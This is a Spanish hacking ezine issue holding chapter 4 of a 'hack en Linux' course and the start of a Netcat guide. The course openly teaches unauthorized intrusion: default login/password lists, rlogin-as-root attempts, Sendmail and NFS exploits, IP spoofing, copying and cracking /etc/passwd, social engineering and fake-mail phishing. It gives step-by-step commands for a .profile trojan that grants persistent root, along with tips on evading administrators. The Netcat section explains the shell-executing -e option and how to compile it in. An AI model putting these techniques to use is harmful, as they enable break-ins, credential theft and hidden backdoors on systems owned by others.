---
title: "ph4-03"
ezine: "portal_hack"
---

# ph4-03

**Ezine:** portal_hack

<div className="ascii-content">

```
[::...........................o( hACK )o............................::]

1. Curso de hack en LiNUX [4/6]

Bienvenidos a este curso a continuacion veremos las unidades:

 òCapφtulo 1 - El arte del hacking 
 òCapφtulo 2 - Manejando Linux. Entendiendo UNIX. 
 òCapφtulo 3 - Breve anßlisis de los sistemas UNIX. 
 òCapφtulo 4 - Entrar en un sistema y enROOTarse. 
 òCapφtulo 5 - Ocultarse en un sistema. Seguir hackeando en otros sistemas. 
 òCapφtulo 6 - Apaga y vßmonos. 

***************************
Capφtulo 4
Entrar en un sistema y "enrootarse" 
***************************

En esta unidad aprenderΘis:
òC≤mo recoger informaci≤n del sistema al que queremos entrar 
òTΘcnicas para entrar sin tener una cuenta en el sistema 
òC≤mo conseguir root dentro del sistema
òQuΘ hacer una vez se es root en el sistema 
òC≤mo asegurar el futuro acceso al sistema una vez se es root

Bien, estamos ante la lecci≤n clave de este curso. Para entenderla, es esencial que hayas leido las lecciones anteriores, especialmente la 1 y la 2. 

Entrar en un sistema.

Esta es la acci≤n principal y primordial para hackear. 

La acci≤n de entrar en un sistema se puede dividir en dos fases :
òRecogida de informaci≤n 
òIncursi≤n en el sistema: 
o bien 
òA travΘs de una cuenta shell 
òA travΘs de otros mΘtodos 

Pero tambiΘn tenemos que saber que la entrada en un sistema puede ser, seg·n el nivel de privilegio:

a.Directamente como root 
b.Como usuario normal 
c.como usuario an≤nimo (pero esta ·ltima queda descartada ya que como usuario an≤nimo no podemos hacer prßcticamente nada.)

Asφ pues, antes de entrar en un sistema (aunque ya tengamos una cuenta shell), tenemos que pasar por la etapa de recogida de informaci≤n.

1 - Recogida de informaci≤n

La informaci≤n que debemos saber de cualquier sistema la vamos a dividir en:
1.Informaci≤n primordial 
2.Informaci≤n extendida 
3.Informaci≤n complementaria

La informaci≤n primordial la tenemos que saber sea como sea, si no, ya nos podemos olvidar del sistema y buscarnos otro. La informaci≤n extendida nos serß de utilidad mßs adelante, y la complementaria... bueno, siempre va bien tenerla.

Informaci≤n primordial: cußl es y c≤mo se consigue

La informaci≤n primordial de cualquier sistema es quΘ Host/IP tiene, asφ como la versi≤n de UNIX que usa. Si tenemos el host y queremos saber la IP, basta con teclear:

# nslookup &lt;host>

Una vez sabemos el Host/IP de un sistema, tenemos que hacer un telnet a Θste y observar quΘ versi≤n de UNIX usa. El nombre del sistema nos basta para la informaci≤n primordial (si es SunOS, si es Solaris, si es Linux, etc...).
# telnet &lt;host> 
SunOS v3.25 
login:

Informaci≤n extendida: cußl es, para quΘ usarla y c≤mo se consigue

Al hacer el telnet, no estarφa mal que apareciese quΘ versi≤n (sea el UNIX que sea) estß usando. Es un dato que puede ayudarnos a elegir exploits para usarlos mßs adelante.

Otro dato que nos puede ayudar (y mucho) es la versi≤n de Sendmail que usa. Esto lo conseguimos haciendo un telnet al puerto 25 del host. 

Nota: si el sistema que queremos hackear no permite hacer un telnet al puerto 25, deberemos descartar cualquier ataque vφa Sendmail.

Para hacer un telnet al puerto 25 del host, escribimos simplemente esto:
# telnet &lt;host> 25
Y nos aparecerß una lφnea con la versi≤n del Sendmail.

Otra informaci≤n extendida importante es saber detectar si el host tiene alguna actividad NFS. NFS (Network File System) es un sistema por el cual un ordenador puede compartir directorios con otros ordenadores, de manera que estos pueden manejar dichos directorios como si fuesen suyos. En muchos sistemas UNIX, el NFS estß mal configurado, lo que supone un fallo de seguridad. Para saber si este sistema recibe directorios NFS, y si es que sφ, cußles son, escribiremos:

# showmount -e &lt;host>

Podrφamos considerar importante mßs informaci≤n, pero con esta ya tenemos de momento suficiente.

Informaci≤n complementaria

Siempre va bien saber, por ejemplo, quΘ tipo de sistema es (si es gubernamental, si es una universidad...), en quΘ sitio geogrßfico estß situado, cußnto tiempo lleva on-line, quΘ servicios ofrece, y un largo etcΘtera.

2 - Incursi≤n en el sistema

Bien, ahora que ya tenemos suficiente informaci≤n vamos a tratar algunos de los mΘtodos que se suelen usar para entrar en un sistema (los mßs fßciles, por supuesto).

Si ya tenemos una cuenta shell, nos basta con entrar vφa telnet, poner el login y el password y ya estamos dentro. Si este es el caso, deberemos pasar a ver c≤mo podemos obtener root.

Pero si estamos en nuestro ordenador y no tenemos ni siquiera un login, vamos, que no sabemos quΘ hacer para poder entrar, antes que nada probaremos los mΘtodos que s≤lo funcionan de vez en cuando, mΘtodos que pueden parecer anti-elitistas, pero que muchas veces nos ahorran esfuerzo mental si, de casualidad, funcionan, claro estß.

Un ejemplo puede ser un rlogin por el morro. Por increφble que parezca, mi primera incursi≤n en un sistema fue gracias a esta tßctica. Simplemente escribimos:

# rlogin &lt;host>

Y hay una probabilidad entre 100 de que entremos. Pero lo bueno es que entramos directamente como root, que fue lo que a mi me sucedi≤. Lo que ocurre es que, al no especificar con quΘ nombre (login) queremos entrar en el sistema, el comando entiende que queremos entrar como root, y como no hemos puesto password, entiende que el password es simplemente, ENTER (o sea, nada). En otras palabras, que hemos entrado con la cuenta de root sin asignar password, el root no tiene aun un password asignado, cosa que es prßcticamente imposible (para quΘ negarlo) í Pero nunca estß de mßs probarlo !

Y otra tßctica de este tipo consiste en hacer lo mismo, pero usando las "default counts", que son las cuentas que vienen por defecto en cualquier sistema UNIX, y, a no ser que el root les cambie el password o las desactive, se pueden usar. Esto es bueno probarlo porque algunas veces el root solo actualiza las cuentas que usa y las otras las deja activadas. Las default counts, en sistemas UNIX son:

Login / Password
admin - admin 
sysadmin - sysadmin o admin 
unix - unix 
uucp - uucp 
rje - rje 
guest - guest 
demo - demo 
daemon - daemon 
sysbin - sysbin 
bin - bin 

Las cuentas bin son muy interesantes ya que permiten la manipulaci≤n de muchos ficheros importantes como el fichero passwd.

adm - adm 
nuucp - nuucp 
lp - lp 

Si con Θstas no funciona, entonces tenemos que pensar un poco mßs. Vamos a ver, si el sitio al que nos conectamos se llama por ejemplo "Daddy's INC", no estarφa de mßs probar a entrar como daddys, o daddy. 

Algunos sistemas UNIX tienen una cuenta llamada test abierta, sin password, o con el mismo login y password (test/test).

En unos pocos sistemas UNIX, podemos ejecutar algunos comandos en el prompt de login. Estos pueden ser bßsicamente tres:

who
rwho
finger

Con lo que podemos saber si hay alguien dentro del sistema. Y, si hay alguien, ya tenemos el login de un usuario. Imaginemos que hay un tal "pepe" conectado. Probablemente, serß de esos que prefiere conectar rßpido al sistema y no le ha pasado nunca por la cabeza que alg·n hacker pueda usar su cuenta. Asφ que no estarφa de mßs intentar entrar como pepe y poner como password pepe, pepe1, pp, o lo que se nos pase por la cabeza...

Bueno, como seguramente no hemos entrado en el sistema, ya nos podemos quitar las lega±as y pasar a hacer algo mßs serio. Si seguimos fuera del sistema, tenemos varias opciones:

òExplotar el Sendmail 
òExplotar el NFS mediante un IP Spoofing

Lo primero, consiste en usar el sistema de Mail del ordenador para obtener privilegios de root. Esto se hace aprovechando los fallos que presenta seg·n la versi≤n que use (ver informaci≤n extendida). Asφ que a partir de ahora ya podemos empezar a usar exploits para hacer nuestras tareas mßs fßciles. Muchos no sabrΘis de lo que estoy hablando. Asφ que vamos a explicar lo que es un exploit.

Un exploit no es mßs que un programa que aprovecha los bugs de un sistema UNIX determinado. Hay, por supuesto, muchos exploits, para cada tipo de sistema, y diariamente van saliendo nuevos seg·n los sistemas se actualizan y se van encontrando nuevos fallos. Los buenos hackers saben programar sus propios exploits, pero de momento vamos a coger los que ya estßn hechos. Una direcci≤n donde podemos encontrar muchos es: www.rootshell.com. Los exploits estßn programados en C o en shell. Y, dentro de la programaci≤n en shell podemos encontrar diferentes tipos, seg·n el tipo de shell en que se base (BASH, PERL...). Una vez tenemos el exploit que queremos usar, debemos editarlo, leer las instrucciones que contenga (muchos contienen lineas de texto haciendo referencia a las maneras que hay de usarlo, c≤mo hay que usarlo para que funcione de una manera u otra, etc) y salvar s≤lo la parte ejecutable (ya sea en shell o en C). Si estß en C tendremos que compilar el exploit. Si estß en shell, basta con darle permiso de ejecuci≤n y ya estß listo para usar. Poco a poco os irΘ hablando de las diferentes maneras de usar los exploits.

Ahora que ya sabemos lo que es un exploit, podemos ir a cualquier site y bajarnos todos los que haya referentes a la versi≤n de Sendmail que usa este sistema, compilarlos (si necesitan ser compilados), y usarlos. 

Realmente, el sistema de Mail de UNIX es muy ·til para hacer fake mails, una vez dentro del sistema. Podemos hacernos pasar por cualquier direcci≤n de correo existente. 

Es importante la organizaci≤n de los exploits en el disco duro, la mejor manera es clasificarlos seg·n: quΘ tipo de exploit son y a quΘ sistema hacen referencia. 

Bueno, los exploits locales son una buena manera de entrar directamente, pero no siempre funcionan, sobretodo porque los mismos exploits suelen tener bugs y tenemos que saber modificarlos, pero por esto de momento no os preocupeis. Hay, por supuesto, tΘcnicas mßs avanzadas para entrar en sistemas. Una de ellas es el IP Spoofing.

El IP Spoofing nos permite cambiar nuestra IP. Vale, pero ┐ QuΘ ganamos con eso ? Bien, supongamos que el sistema al que queremos entrar estß en una subred, y, por lo tanto, se comunica con sistemas trusteds, sistemas que son "colegas". ┐ QuΘ quiere decir que son colegas ? Pues que estßn comunicados entre sφ y que por lo tanto tienen ciertos privilegios (tienen acceso a directorios compartidos vφa NFS). Los programas de IP Spoofing lo que hacen es (de manera simplificada), intentar comunicar con un sistema trusted (colega del sistema al que queremos entrar), hacer que no responda y en ese intervalo de tiempo alterar nuestra IP para hacernos pasar por ese sistema, de manera que ya tenemos ciertos privilegios en el sistema en el que queremos entrar. 

Lo primero que tienes que hacer para poner en prßctica esta tßctica es bajarte un buen programa de IP Spoofing. Mejor bßjate varios por si alguno no funciona. Ahora tienes que saber cußles son los sistemas trusteds del sistema al que quieres entrar. En otras palabras, quΘ estructura NFS tiene. Para esto escribe lo siguiente:

# showmount -e &lt;host>

Por otra parte, esto ya lo tendrφas que haber hecho al recopilar la informaci≤n del sistema. 

Y, con estos datos, ya puedes ejecutar el programa de IP Spoofing, que seguramente lo harß todo Θl solito. No olvides compilarlo (si estß en C) y quitar las instrucciones.

En teorφa con todas estas tΘcnicas puedes pasarte un buen rato intentando entrar en un sistema. He dejado muchas tΘcnicas por explicar y las que he descrito las he descrito muy por encima, porque considero que un hacker novicio ha de empezar siempre teniendo shells. Es decir, que ya conozcas de antemano alguna cuenta en ese sistema, eso facilita muchφsimo las cosas. La ·nica manera de conseguir una sino puedes ni siquiera entrar de forma an≤nima en un sistema es utilizar la ingenierφa social. Si conoces el lugar fφsico en el que estß ubicado el sistema, tienes que relacionarte con la gente que accede a Θl, robar papelillos o cogerlos de la papelera, espiar, hacer lo que sea hasta conseguir una cuenta en el sistema. El IRC puede ser un buen medio, pero tambiΘn tienes que saber pedir las cosas. Internet, en definitiva, es un buen medio. Alguna que otra pßgina encontrarßs con shells. El fake mail puede ser tambiΘn ·til, hacerte pasar por alguna direcci≤n importante de un proveedor de internet y enviar un mail a un usuario de ese proveedor para de alguna manera averiguar su login y password, aunque para eso tienes que estar antes en un sistema UNIX, y no todos los sistemas UNIX permiten hacer fake mails, o sea que esta tΘcnica queda descartada. Pero si buscas informaci≤n al respecto no te estarß de mßs.

Conseguir ROOT una vez dentro del sistema

Bien, si hemos conseguido finalmente entrar en el sistema con shell de usuario ordinario, tenemos muchas cosas que hacer. Lo primero que querremos hacer es, por supuesto, ver quΘ posibilidades nos ofrece nuestra cuenta. 

1 - Hacemos un listado de nuestro directorio de inicio
2 - Miramos quΘ programas colectivos podemos ejecutar
3 - Echamos un vistazo al archivo .profile

Nuestro directorio de inicio, dependiendo de en quΘ tipo de ordenador estemos estarß generalmente ocupado por programas en C o documentos relacionados con carreras universitarias (si estamos en una universidad). Conviene no modificar ninguno de estos elementos, porque el usuario real de esta shell se darφa cuenta de que la fecha ha cambiado. Y a·n peor si se nos ocurre borrarlos. Simplemente les echamos un vistazo (si nos interesa, claro).

Ahora ejecutamos el comando help para ver quΘ programas colectivos podemos ejecutar (editores de texto, programas de mail, etc...). Y por ·ltimo, no nos irß mal saber quΘ hay en nuestro .profile, y, si tenemos que modificarlo, no tenemos que olvidar volver a poner la fecha original (con el comando touch). 

DespuΘs tenemos que intentar movernos del directorio en el que estamos, a ver si podemos explorar otras ßreas del sistema. Si no podemos, no hay que desesperarse. Quizßs sφ podemos leer ficheros del sistema aunque no podamos movernos del directorio, por eso tenemos que probar a hacer esto:
$ cat /etc/passwd 
Si estamos de suerte y sale algo, pues grabamos la informaci≤n en un fichero nuestro.

$ cat /etc/passwd >> passwd
Y ya tenemos el archivo passwd.

Ahora vamos a mirar mßs archivos importantes
$ cat /etc/hosts

Este archivo te mostrarß todos los sistemas que estßn en la subred del sistema en el que estßs. Esto te puede ser ·til porque, si te cierran la cuenta aquφ, probablemente puedas intentar entrar en alg·n sistema de la misma subred con la misma cuenta. Si te interesa, salva esta informaci≤n en otro archivo.

Ahora vamos a ver quΘ podemos hacer con el archivo passwd.

Como ya sabeis, este fichero contiene las cuentas del sistema. TambiΘn sabeis quΘ elementos contiene. Cuando dije que contenφa el password del usuario dije que nunca aparecφa tal y como era. El password puede aparecer de varias formas:

Shadow

Cuando el password estß shadow, en realidad se encuentra en otro archivo que se llama shadow, que no es visible mßs que por el root. En este caso no podemos hacer nada. Aparece shadow si aparece como un asterisco o una x:

Anastasio:*:1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh
Anastasio:x:1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh 

Encriptado

El password estß encriptado si estß formado por una combinaci≤n muy extra±a de carßcteres. Esta combinaci≤n no es el password en sφ, sino el password encriptado. En este caso sφ podemos hacer algo, es mßs, tenemos muchas posibilidades de descubrir de quΘ password se trata. Lo que tenemos que hacer es bajarnos un buen desencriptador de passwords. Yo suelo usar el John The Ripper, es un desencriptador muy bueno. Los desencriptadores suelen funcionar intentando asociar una serie de palabras agrupadas por temas a los passwords encriptados. Estas agrupaciones se llaman diccionarios y tambiΘn se pueden bajar. Aunque, si queremos desencriptar bien las contrase±as hay algunos desencriptadores que hacen una desencriptaci≤n completa, sin usar ning·n diccionario, prueban todas las combinaciones posibles. Lo malo que tiene este sistema es que el proceso de desencriptaci≤n puede tardar muchas horas, pero vale la pena sobretodo si tienes un archivo de passwords con una cuenta root encriptada. 

Los desencriptadores, por supuesto, funcionan off-line. Asφ que lo que tienes que hacer si has conseguido el archivo de contrase±as encriptado es desconectar y probar a desencriptarlo.

Una cuenta encriptada tiene este aspecto:

Anastasio:Mo54Wasl6H:1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh

Normal

Si encuentras alguna cuenta asφ, te mereces un premio, porque prßcticamente es imposible de encontrar. Simplemente la contrase±a se muestra tal cual es.

Anastasio:juana:1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh

Sin password

En este caso no hay password, para acceder con esta cuenta simplemente hacemos telnet, ponemos el login y ya estamos dentro.

Anastasio::1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh

Nota: Hay que tener en cuenta que si nos encontramos un espacio en blanco, un asterisco o un signo de admiraci≤n delante del password, la cuenta estß inhabilitada temporalmente, eso significa que el acceso del usuario al sistema ha sido restringuido por el admin (í o por un hacker !).

Bueno, crackear el archivo password es una posibilidad a tener en cuenta para conseguir acceso root, averiguando cußl es la contrase±a que usa el root. En el hipotΘtico caso de que lleguemos a saber cußl es la contrase±a del root, lo que tenemos que hacer es, ante todo, no cambiarla (una vez estemos dentro como root). DespuΘs, pasar a mirar la parte de esta unidad referente a quΘ hacer cuando se es root.

Si lo del archivo passwd no ha resultado, vamos a pasar a intentar buscar defectos en el sistema en el que estamos. Ya podemos ir preparando los exploits que necesitemos. Ahora bien, ┐ Con quΘ criterio hay que elegirlos ? Los exploits que ejecutes en el sistema tienen que cumplir siempre estas condiciones:

1 - La mßs trivial, que hagan referencia al sistema UNIX en el que estßs. No ejecutes un exploit para HP-UX si estßs en un Solaris. 
2 - Que hagan referencia a la versi≤n exacta del sistema UNIX en el que estßs. De una versi≤n a otra se corrigen los errores, por lo tanto un exploit para AIX 3.25 no funcionarß en un AIX 4.x
3 - Que sean lo mßs nuevos posibles. Los exploits aparecen a medida que se van encontrando los errores en los sistemas. Por lo tanto, hay mßs posibilidades que el admin del sistema no haya tenido tiempo a parchear el bug al que haga referencia el exploit. En ciertos sites como rootshell.com aparecen exploits nuevos cada mes. 
4 - Que hagan lo que necesitas que hagan. Leete quΘ es lo que hacen, inicialmente te interesa ganar acceso root, pues coge solo los que hagan esto. No te interesarß, por ejemplo, hacer petar el sistema, ni colocar un sniffer. TambiΘn habrßn exploits que para ejecutarlos necesitarßs ser root en el sistema í Tampoco te interesan !

Nota: En el capφtulo 3 hay algunos de los bugs mßs conocidos de cada sistema UNIX. Para poder aprovecharlos, busca los exploits que hagan referencia a esos bugs.

No todos los exploits son iguales, eso es algo que ya hemos comentado antes. Antes he mencionado la palabra exploit local. Llegados a este punto, tienes que entender la diferencia entre exploit local y exploit remoto:

- Exploit local: tanto si estß en C como en Shell, tiene que ejecutarse sin estar conectado a ning·n sistema (í pero sφ a Internet !).
- Exploit remoto: Si estß en C, hay que subir el c≤digo fuente al sistema y compilarlo DENTRO del sistema. Una vez compilado se ejecuta. Si estß en Shell simplemente hay que subirlo al sistema y ejecutarlo dentro del sistema.

Ahora vamos a ver c≤mo podemos poner a punto nuestro exploit. Debes seguir este proceso:

1 - Descomprime el exploit si estß en formato .tgz. Esto lo puedes hacer con:
# tar xfvz &lt;nombre del archivo>.tgz

2 - Edita el exploit.
Te encontrarßs con que algunos exploits no son mßs que un archivo de texto explicando c≤mo aprovechar un bug. Si este es el caso, lΘete cuidadosamente el archivo y apunta en un papel lo que te diga que tienes que hacer (normalmente te dirß que usando un comando de tal manera puedes conseguir root o leer ciertos archivos...). Otros exploits serßn shellscripts, y al principio habrßn las instrucciones. Tienes que leΘrtelas bien, y guardar en otro archivo solo el shellscript (quitando las lφneas de texto que sobren). Para poder ejecutarlo tienes que darle permiso de ejecuci≤n. Otros serßn programas en C, en este caso si hay instrucciones, estas son ignoradas al compilar, asφ que no hay problema. Ya sabes que si es un exploit remoto tienes que subir el c≤digo al sistema (esto puedes hacerlo a travΘs de una sesi≤n FTP, usando el mismo login y el mismo password que para la sesi≤n telnet), y una vez dentro, compilarlo (haciendo una sesi≤n telnet) usando esta lφnea:

$ gcc &lt;archivo>.c

Y el resultado de esta operaci≤n serß un archivo llamado a.out, que tienes que renombrar a tu gusto ( o ejecutar directamente con ese nombre ).

Hay exploits que son una mezcla entre C y shellscript, es decir, que una parte estß en C y otra en shell. En este caso tienes que separar las dos partes en dos archivos distintos y hacer lo que ya sabes.

3 - La ·ltima parte es ejecutarlos, esperando que funcionen. Suelen funcionar si el sistema no estß parcheado al mßximo. 

Experimenta por ti mismo todo lo referente a exploits, ahora que ya sabes c≤mo utilizarlos. 

Pero recuerda, si los exploits que has seleccionado no funcionan, no hagas el tonto subiendo otros que sabes que no van a funcionar. Debes saber que todo lo que haces en un sistema UNIX queda registrado en varios logs (algo que veremos en la pr≤xima lecci≤n), asφ que si en una sesi≤n no has conseguido hacerte root, al cabo de un dφa tu cuenta estarß cerrada porque, probablemente, el admin se habrß dado cuenta de que has estado haciendo cosas "sospechosas". Por si acaso, si te tienes que ir, no olvides dejar el directorio de inicio del usuario tal y como estaba. Si te dejas tus exploits ahφ, te puedo asegurar que te van a cerrar la cuenta pase lo que pase (porque el usuario se darß cuenta y lo comunicarß al admin). TambiΘn he comentado que, si has modificado alg·n archivo ya existente, tienes que volver a ponerle la fecha que ya tenφa con el comando touch. 

Pero si te han cerrado la cuenta, lo que tienes que hacer es buscarte mßs shells y seguir practicando.

Si has conseguido nivel root, vamos a pasar a explicar quΘ es lo que tienes que hacer.

┐ QuΘ hacer una vez se es ROOT ?

Una vez eres root, el sistema es tuyo. No hay ning·n tipo de restricci≤n, puedes pasearte por el sistema como si fuese tuyo. Es muy importante, cuando se es root, asegurarse de que nos vamos a ir sin dejar ninguna huella. Pero esto lo voy a explicar en la pr≤xima lecci≤n. Asφ mismo, si queremos asegurarnos nuestra continuidad como hacker en ese sistema, tenemos que ingeniarnos alg·n mΘtodo para que podamos entrar y salir siendo siempre root. Una manera serφa hacer el mismo proceso que hemos hecho para conseguir root. Pero, ┐ Y si es un proceso demasiado largo ? ┐ Y si tenemos root y no sabemos ni c≤mo lo hemos conseguido ? 

Podrφamos crear una cuenta con acceso root, pero el admin del sistema lo acabarφa viendo. Lo que podemos hacer es usar el .profile del root para asegurarnos el futuro acceso mediante un caballo de troya. 

Muchos os preguntareis ┐ QuΘ es un caballo de troya ? Bueno, un caballo de troya no es mßs que un proceso oculto. Vamos a verlo mediante un ejemplo muy sencillo:

Caballo de troya 1

Vamos a meter un caballo de troya en el archivo .profile de un usuario normal. Nos movemos a su directorio de inicio. 

Lo primero que hacemos es una copia del archivo original a un archivo temporal oculto:
# cp .profile .temp

Ahora, editamos el archivo .profile y a±adimos estas lφneas al final:
echo " Bienvenido, Anastasio Fernßndez "
echo " Que tengas un buen dφa. "
echo " ┐ A que no sabes c≤mo te estßn llegando estas lφneas ? " 

Y la lφnea mßs importante que tenemos que a±adir es:

mv .temp .profile

┐QuΘ hemos hecho con esto?. Acabamos de ocultar un proceso, en este caso un mensage de bienvenida. El archivo original .profile estaba guardado en en uno temporal (.temp). De manera que cuando Anastasio entra en el sistema, su .profile (que es el que hemos modificado) se encarga de ocultarse moviendo el contenido del archivo temporal otra vez al archivo profile, de manera que cuando Anastasio mire en su .profile no verß nada anormal. Excepto la fecha de modificaci≤n, pero eso lo podemos arreglar a±adiendo un comando touch al final del caballo de troya. 

Naturalmente no es muy recomendable hacer esto, ya que a un usuario normal no le harφa mucha gracia y comunicarφa al admin que ha entrado un hacker en el sistema.

Ahora que ya sabemos quΘ es un caballo de troya, vamos a hacer el caso que nos ocupa:

Caballo de troya 2 

Vamos a hacer que un usuario normal consiga root instantßneamente al entrar en el sistema. Para aquellos que pilleis las cosas rßpido, se trata de:
òHacer una copia del .profile del root en el directorio de inicio de un usuario normal 
òConvertir esta copia a ejecutable 
òHacer una copia del .profile del usuario normal a un archivo temporal oculto 
òModificar el .profile para que el usuario, cuando entre: 
òEjecute el .profile de root 
òBorre el .profile de root 
òMueva el contenido de la copia de su .profile (temp) a su .profile real

Si habΘis seguido las lecciones hasta aquφ no tendrΘis problema en hacer este caballo de troya.

Pero para los mßs despistados, aquφ estß el proceso:

# cd /root
# cp .profile /usr/anastasio/.runme
# cd /usr/anastasio
# chmod a+x .runme
# cp .profile .temp
# ed .profile

Y a±adimos:

.runme
rm .runme
mv .temp .profile

Asφ, cada vez que entremos con la cuenta de Anastasio, seremos root. Naturalmente tambiΘn puede ser que Anastasio Fernßndez, el usuario real de la cuenta, entre y vea que es root. Por eso recomiendo hacer esto: salir del sistema a hacer lo que tengamos que hacer, y al cabo de un rato volver a entrar (seremos root) y no volver a hacer este caballo de troya. Si en este intervalo de tiempo ha entrado Anastasio Fernßndez, ya no hay nada que hacer. Pero siempre podemos pensar que hemos hecho feliz a alguien.

Bueno, siendo root se pueden hacer infinidad de cosas. Si quieres, disfruta de tu limitado acceso root (ahora que no sabes c≤mo borrar tus huellas) curioseando por el sistema. No te recomiendo que borres nada. Simplemente mira a ver quΘ hay. Y, ahora que sabes hacer caballos de troya, puedes divertirte haciΘndolos en los .profile's de los usuarios normales. Por ejemplo, puedes poner un mensage personal si conoces a alguien del sistema. 

í SΘ paciente y dentro de poco descubrirßs c≤mo borrar tus huellas en los sistemas en los que te enrootes ! Ademßs, aprenderßs a poner Sniffers. í Todo esto y mucho mßs en la pr≤xima lecci≤n ! í Nos vemos !

----------------;))
2. Netcat

 Netcat  es un  pequeño programa creado para uso de los Administradores
de redes (y por supuesto para los Hackers) :), este proggie fue creado
originalmente  por  Hobbit  y  porteado a Win95 y NT por Weld Pond  de
L0pht, tiene  mas de  un año desde que fué Liberado y muy poco  se  ha
escrito sobre este Programita; Principalmente porque la estructura  de
sus  comandos  es  poco familiar para el usuario medio.  Netcat  tiene
infinidad  de  funciones, aunque se deja que sea el usuario quien  las
averigüe :P, y  en el  archivo de  ayuda  ponen algunos ejemplitos muy 
elementales solamente...
 La especialidad de Netcat es el Protocolo TCP/IP, y le da a la máquina
de windows,  cierto  poder  sobre  este protocolo que solo tenía UNIX,
trabaja  con  líneas de  comandos desde  MS-DOS (o desde  el Shell  de
Linux), y según parece, puede hacer casi cualquier cosa sobre  TCP/IP.
El comando principal es nc con su respectiva variable u opción al  más
puro estilo Unix.

 Cabe  destacar que la información sobre Netcat y sus usos  específicos
es  bastante  limitada; aunque  Hobbit  en  su documento aclara muchas
cosas,  cita  algunos  ejemplos  y dice que NetCat puede ser utilizado
para mas de 1001 vainas...

  Netcat puede ser encontrado en: http://www.l0pht.com/~weld/netcat

	Netcat en WinX
	==============
	
  Este  es el  resultado del comando de ayuda de netcat en  una  máquina
  windows

 c:>nc -h

connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [options] [hostname] [port]
options:
        -d              detach from console, stealth mode

        -e prog         inbound program to exec [dangerous!!]
        -g gateway      source-routing hop point[s], up to 8
        -G num          source-routing pointer: 4, 8, 12, ...
        -h              this cruft
        -i secs         delay interval for lines sent, ports scanned
        -l              listen mode, for inbound connects
        -L              listen harder, re-listen on socket close
        -n              numeric-only IP addresses, no DNS
        -o file         hex dump of traffic
        -p port         local port number
        -r              randomize local and remote ports
        -s addr         local source address
        -t              answer TELNET negotiation
        -u              UDP mode
        -v              verbose [use twice to be more verbose]
        -w secs         timeout for connects and final net reads
        -z              zero-I/O mode [used for scanning]
port numbers can be individual or ranges: m-n [inclusive]

  Bien;  un  análisis  rápido  de estas variables nos  da  una idea  del
  potencial  de  este pequeño programa y las infinitas posibilidades que
  nos ofrece él  poder  manejar  conexiones de  una manera  tan básica y
  sencilla:

<------ Opciones de Netcat --------->

-d  (Modo Stealth o encubierto) 

  Esta opción desvincula al Programa de la consola, haciéndolo  trabajar
  en el BackGround.

-e&lt;prog>  (Ejecuta un programa cuando se conecta) 

  Puede ser utilizado para ejecutar incluso un Shell tanto en WinX  como
  en *NIX.

-l  (Escuchando conexiones) 

  Deja a un puerto abierto en espera de una conexión

-L  (lo mismo que anteriormente pero sigue escuchando aún cuando la
  conexión es cerrada)

  Esta opción es incluida en la versión de Weld Pond de L0pth, y es  muy
  útil para seguir escuchando en el puerto, a diferencia de -l  (que  la
  conexión cerrada termina con el proceso de nc) esta  opción -L permite
  seguir   escuchando  en  el  mismo  puerto  (la  rutina  de  nc -l  es
  reincidida).

-n   (Dirección numérica especifica; no hace un DNS Lookup) Netcat tiene
  la facultad de resolver nombres de dominio mediante un DNS Lookup, con
  esta  opción  le  especificamos  que  no  lo  haga,  y  use  solamente
  direcciones IP.

-o&lt;logfile>  (obtiene  un archivo log en Hex de la acción) Genera un Log
  de las actividades de netcat en código Hexadecimal.

-p&lt;puerto> (Puerto para pegarse) Algunas veces debes  especificarle  con
  esta opción el puerto a realizar una acción.

-s&lt;IP addr>  (pegarse a un IP especifico) Netcat  puede  utilizar IP  de
  una red como fuente local.

-t   (Funciona como un  pequeño  demonio  telnet)  Con  esta  opción  le
  especificas a netcat que debe realizar negociaciones telnet.

-u  specify UDP (Utilizar Protocolo UDP)  Con  esta opción  le  dices  a
  netcat que trabaje con protocolo UDP en vez de TCP.

-v   (modo verbose, mas información, se le puede añadir otra -v para mas
  info todavía)  Bastante  útil y necesario,  sobre  todo  para estudiar
  demonios en profundidad y observar todos los detalles en un Sniffing.

-w &lt;segundos> (Especifica  un  tiempo  para terminar) Con esta opción le
  especificas un tiempo determinado para realizar conexiones.

-r (Genera un Patrón Ramdom de puertos locales o remotos) Muy útil  para
evitar patrones lógicos de Scanning.

-g &lt;gateway> (especificar Gateways) Una de las opciones más interesantes
  de netcat, permite utilizar Routers como "puentes" de conexión.

-G &lt;numero> (Especificar puntos de  Routing), Con  esta  opción  podemos
  crear una cadena aleatoria de hosts para crear una ruta  perdida  para
  tus paquetes (Spoofing).
 
-i &lt;segundos>  Especifica  un  intervalo   de  segundos   entre  puertos
  Scaneados.

<------------- Fin de las opciones comentadas ------> 

Netcat en Linux
===============

 Netcat en una plataforma como Linux se convierte en una  utilidad  muy
potente,   pudiendo   ser  utilizado  en  conjunto  con  lenguajes  de
programación como Perl y C , o bien  desde la propia Línea de comandos
del poderoso Shell de Linux mediante Shell Scripts.

 Cabe destacar que distribuciones como RedHat Linux trae junto  con sus
paquetes  de  instalación  una  versión  limitada  de  netcat;  lo más
recomendable es bajar de la red la versión  full de netcat para  Linux
(Importante: La versión de netcat para linux viene a prueba de lamers,
por lo cual debemos compilar a netcat con unos flags  especiales  para
poder  obtener  las opciones -t y -e (Telnet y Gaping Security Hole)).
Bajas el .tar de  netcat y  lo  desempaquetas  en el directorio  de tu
preferencia, te ubicas dentro del directorio  de netcat y lo  compilas
con Make utilizando las siguientes Flags:

[root@DarkStar] #make linux DFLAGS=" -DTELNET -DGAPING_SECURITY_HOLE"

 Copias el binario (nc) al directorio /usr/bin , de esta manera  podrás
usar netcat directamente  llamándolo  de  cualquier  parte  del Shell,
además de que podrás usar los scripts que hagas (o consigas en la red)
sin  problemas;  netcat  trae  unos  scripts  muy  interesantes y bien
comentados para que los estudies y comprendas mejor su  implementación
en scripts, los scripts están en el directorio donde  desempaquetastes
netcat en /scripts , los  corres  como siempre: ./probe  (o  el script
que quieras).


Utilizando Netcat
=================

 Para  ilustrar  mejor  como trabajamos con este programa, lo mejor  es
observar  ejemplos  prácticos  y  analizar  su  estructura  para poder
comprender  mejor como funciona y  así poder  crear  nuestras  propias
aplicaciones.

 Algunas de las cosas que podemos hacer con NetCat son:

